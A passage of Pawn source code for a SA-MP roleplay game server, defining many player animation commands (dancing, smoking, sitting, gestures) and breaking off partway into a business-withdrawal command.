	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "PED","FLOOR_hit_f", 4.0, 1, 0, 0, 0, 0);
    return 1;
}
CMD:laugh(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:lookout(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    OnePlayAnim(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:aim(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:crossarms(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);
	return 1;
}
CMD:lay(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:hide(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:vomit(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:wave(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:shouting(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"RIOT","RIOT_shout",4.0,1,0,0,0,0);
	return 1;
}
CMD:chant(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"RIOT","RIOT_CHANT",4.0,1,1,1,1,0);
	return 1;
}
CMD:frisked(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"POLICE","crm_drgbst_01",4.0,0,1,1,1,0);
	return 1;
}
CMD:exhausted(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
	return 1;
}
CMD:injured(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:slapass(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    OnePlayAnim(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:deal(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    OnePlayAnim(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:dealstance(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
	return 1;
}
CMD:crack(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:wank(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"PAULNMAC", "wank_loop", 1.800001, 1, 0, 0, 1, 600);
	return 1;
}
CMD:gro(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	LoopingAnim(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:sup(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/sup <1-3>");
	switch (test)
  	{
    	case 1: OnePlayAnim(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0);
     	case 2: OnePlayAnim(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0);
     	case 3: OnePlayAnim(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0);
    	default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/sup <1-3>");
	}
    return 1;
}
CMD:rap(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/rap <1-4>");
	switch (test)
	{
	    case 1: LoopingAnim(playerid,"RAPPING","RAP_A_Loop",4.0,1,0,0,0,0);
    	case 2: LoopingAnim(playerid,"RAPPING","RAP_C_Loop",4.0,1,0,0,0,0);
    	case 3: LoopingAnim(playerid,"GANGS","prtial_gngtlkD",4.0,1,0,0,0,0);
     	case 4: LoopingAnim(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,1,1);
    	default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/rap <1-4>");
	}
    return 1;
}
CMD:push(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
 	OnePlayAnim(playerid,"GANGS","shake_cara",4.0,0,0,0,0,0);
	return 1;
}
CMD:akick(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"POLICE","Door_Kick",4.0,0,0,0,0,0);
	return 1;
}
CMD:lowbodypush(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"GANGS","shake_carSH",4.0,0,0,0,0,0);
	return 1;
}
CMD:spray(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"SPRAYCAN","spraycan_full",4.0,0,0,0,0,0);
	return 1;
}
CMD:headbutt(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	OnePlayAnim(playerid,"WAYFARER","WF_Fwd",4.0,0,0,0,0,0);
	return 1;
}
CMD:pee(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	if(PlayerInfo[playerid][pPaintBallG] > 0) return SCM(playerid,COLOR_SERVER,"{FFF8C6}Command is not currently accessible.");
	{
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_PISSING);
	}
	return 1;
}
CMD:koface(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","KO_shot_face",4.0,0,1,1,1,0);
	return 1;
}
CMD:kostomach(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","KO_shot_stom",4.0,0,1,1,1,0);
	return 1;
}
CMD:kiss(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"KISSING", "Grlfrd_Kiss_02", 1.800001, 1, 0, 0, 1, 600);
	return 1;
}
CMD:rollfall(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","BIKE_fallR",4.0,0,1,1,1,0);
	return 1;
}
CMD:lay2(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"SUNBATHE","Lay_Bac_in",3.0,0,1,1,1,0);
	return 1;
}
CMD:hitch(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"MISC","Hiker_Pose", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:beach(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"BEACH","SitnWait_loop_W",4.1,0,1,1,1,1);
	return 1;
}
CMD:medic(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"MEDIC","CPR",4.1,0,1,1,1,1);
	return 1;
}
CMD:scratch(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"MISC","Scratchballs_01", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:sit(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","SEAT_idle", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
CMD:drunk(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	LoopingAnim(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
	return 1;
}
CMD:bomb(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
   	ClearAnimations(playerid);
   	OnePlayAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
CMD:getarrested(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1);
	return 1;
}
CMD:chat(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
	return 1;
}
CMD:fucku(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    OnePlayAnim(playerid,"PED","fucku",4.0,0,0,0,0,0);
	return 1;
}
CMD:taichi(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    LoopingAnim(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
	return 1;
}
CMD:knife(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/knife <1-4>");
	switch (test)
	{
	    case 1: LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Damage",4.0,0,1,1,1,0);
     	case 2: LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Die",4.0,0,1,1,1,0);
      	case 3: OnePlayAnim(playerid,"KNIFE","KILL_Knife_Player",4.0,0,0,0,0,0);
     	case 4: LoopingAnim(playerid,"KNIFE","KILL_Partial",4.0,0,1,1,1,1);
    	default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/knife <1-4>");
	}
	return 1;
}
CMD:basket(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	new test;
    if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/basket <1-6>");
	switch (test)
 	{
    	case 1: LoopingAnim(playerid,"BSKTBALL","BBALL_idleloop",4.0,1,0,0,0,0);
    	case 2: OnePlayAnim(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
     	case 3: OnePlayAnim(playerid,"BSKTBALL","BBALL_pickup",4.0,0,0,0,0,0);
     	case 4: LoopingAnim(playerid,"BSKTBALL","BBALL_run",4.1,1,1,1,1,1);
    	case 5: LoopingAnim(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
       	case 6: LoopingAnim(playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,0);
    	default: SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/basket <1-6>");
	}
	return 1;
}
CMD:dance(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	if(PlayerInfo[playerid][pPaintBallG] > 0) return SCM(playerid,COLOR_SERVER,"{FFF8C6}Command is not currently accessible.");
	{
		new test;
		if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dance <1-4>");
		if(test < 1 || test > 4) return SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dance <1-4>");
		if(test == 1)
		{
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		}
		else if(test== 2)
		{
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		}
		else if(test == 3)
		{
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		}
		else if(test == 4)
		{
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
		}
	}
	return 1;
}
CMD:smoke(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
	if(PlayerInfo[playerid][pPaintBallG] > 0) return SCM(playerid,COLOR_SERVER,"{FFF8C6}Command is not currently accessible.");
	{
		new test;
		if(sscanf(params, "d",test)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/smoke <1-2>");
		if(test < 1 || test > 2) return SendClientMessage(playerid,COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/smoke <1-2>");
		if(test == 1)
		{
		    ApplyAnimation(playerid, "SMOKING", "M_smk_in", 4.0, 0, 0, 0, 0, 0);
		}
		else if(test== 2)
		{
		    ApplyAnimation(playerid, "SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0);
		}
	}
	return 1;
}
CMD:jumpwater(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pSleeping] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not use an animation as sleep.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{999999}Animations are inaccessible on foot.");
    ApplyAnimation(playerid,"DAM_JUMP","DAM_LAUNCH",2,0,1,1,0,0);
	return 1;
}
CMD:bizwithdraw(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new bouse = PlayerInfo[playerid][pPbiskey];
		if (bouse == 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't own a business.");
		new cashdeposit,string[64];
		if(sscanf(params, "d",cashdeposit))
		{
            SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/bizwithdraw <Amount of Money>");
            if(cashdeposit > 10000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Maxim amount of money is $10,000,000.");
			format(string, sizeof(string), "{FFFF00}You have $%s in your till.", FormatNumber(BizzInfo[bouse][bTill]));
			SendClientMessage(playerid, COLOR_SERVER, string);
			return 1;
		}
		if (cashdeposit > BizzInfo[bouse][bTill] || cashdeposit < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You dont have that much.");
		if (!PlayerToPoint(5.0, playerid,BizzInfo[bouse][bEntranceX],BizzInfo[bouse][bEntranceY],BizzInfo[bouse][bEntranceZ]))
		{
